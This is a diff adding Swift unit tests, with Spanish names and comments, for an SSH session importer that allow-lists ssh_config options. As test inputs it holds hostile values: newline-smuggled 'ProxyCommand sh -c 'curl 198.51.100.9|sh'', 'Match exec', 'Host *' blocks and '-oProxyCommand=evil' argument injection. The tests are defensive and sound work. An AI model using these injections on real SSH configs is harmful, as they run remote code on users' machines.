@@ -189,4 +189,63 @@ private let netdeckFile = """
         let extra = ["ProxyCommand nc %h %p", "LocalCommand touch /tmp/x", "ServerAliveInterval 30", "forwardagent yes"]
         #expect(SessionImporter.safeExtra(extra, session: "x") == ["ServerAliveInterval 30"])
     }
+
+    @Test func alImportarSoloOpcionesPermitidasYUnaPorLinea() {
+        // (un salto de línea dentro de una opción abría otra línea: «ProxyCommand …» o un bloque «Host *»)
+        let extra = ["ServerAliveInterval 5\nProxyCommand sh -c 'curl 198.51.100.9|sh'",
+                     "Compression yes\r\nHost *\nStrictHostKeyChecking no",
+                     "Ciphers aes256-ctr\u{2028}LocalForward 8080 192.0.2.1:80",
+                     "ConnectTimeout\t10", "DynamicForward 1080", "UserKnownHostsFile /dev/null", "IdentityAgent /tmp/x",
+                     "Match exec \"touch /tmp/x\"", "# @clave AD"]
+        #expect(SessionImporter.safeExtra(extra, session: "x")
+                == ["ServerAliveInterval 5", "Compression yes", "Ciphers aes256-ctr", "ConnectTimeout 10"])
+    }
+
+    @Test func importarUnJSONConOpcionesMaliciosasNoInyectaNada() throws {
+        let json = #"""
+            {"formato":"netdeck-sesiones","version":1,"sesiones":[
+             {"nombre":"core-01","grupo":"Core","tipo":"ssh","equipo":"192.0.2.11","usuario":"tu.usuario",
+              "opciones":["ServerAliveInterval 5\nProxyCommand sh -c 'curl 198.51.100.9|sh'","Host *\nStrictHostKeyChecking no"]},
+             {"nombre":"malo","grupo":"Core","tipo":"ssh","equipo":"-oProxyCommand=evil"},
+             {"nombre":"malo2","grupo":"Core","tipo":"ssh","equipo":"192.0.2.12","usuario":"-oProxyCommand=evil"}]}
+            """#
+        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
+        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: dir) }
+        let u = dir.appendingPathComponent("sesiones.json")
+        try json.write(to: u, atomically: true, encoding: .utf8)
+        let r = SessionImporter.read(u, existing: [])
+        #expect(r.sessions.map(\.name) == ["core-01"])
+        var f = SessionFile()
+        f.sessions = r.sessions
+        let text = f.render()
+        let config = text.split(separator: "\n").map { $0.trimmingCharacters(in: .whitespaces) }.filter { !$0.hasPrefix("#") }
+        #expect(!config.contains { $0.lowercased().hasPrefix("proxycommand") || $0.hasPrefix("Host *") || $0.hasPrefix("StrictHostKeyChecking") })
+        #expect(text.contains("    ServerAliveInterval 5\n"))
+        #expect(f.problems().isEmpty)
+    }
+
+    @Test func problemasConSaltosDeLineaYBloquesNuevos() {
+        func problems(_ edit: (inout EditableSession) -> Void) -> [String] {
+            var s = EditableSession.new(group: "Core", name: "core-01")
+            s.host = "192.0.2.11"
+            edit(&s)
+            var f = SessionFile()
+            f.sessions = [s]
+            return f.problems()
+        }
+        #expect(problems { _ in }.isEmpty)
+        #expect(!problems { $0.summary = "hola\nProxyCommand evil" }.isEmpty)
+        #expect(!problems { $0.credential = "AD\rHost *" }.isEmpty)
+        #expect(!problems { $0.jump = "bastion\u{2028}ProxyCommand evil" }.isEmpty)
+        #expect(!problems { $0.keyFile = "~/.ssh/id\nProxyCommand evil" }.isEmpty)
+        #expect(!problems { $0.extra = ["ServerAliveInterval 5\nProxyCommand evil"] }.isEmpty)
+        #expect(!problems { $0.extra = ["Host *"] }.isEmpty)
+        #expect(!problems { $0.extra = ["Match all"] }.isEmpty)
+        #expect(!problems { $0.jump = "-oProxyCommand=evil" }.isEmpty)
+        // (un tabulador entre clave y valor es ssh_config válido: no impide guardar)
+        #expect(problems { $0.extra = ["ServerAliveInterval\t30"] }.isEmpty)
+        // (las tuyas escritas en el gestor sí valen: un reenvío, por ejemplo)
+        #expect(problems { $0.extra = ["LocalForward 8080 192.0.2.1:80"] }.isEmpty)
+    }
 }
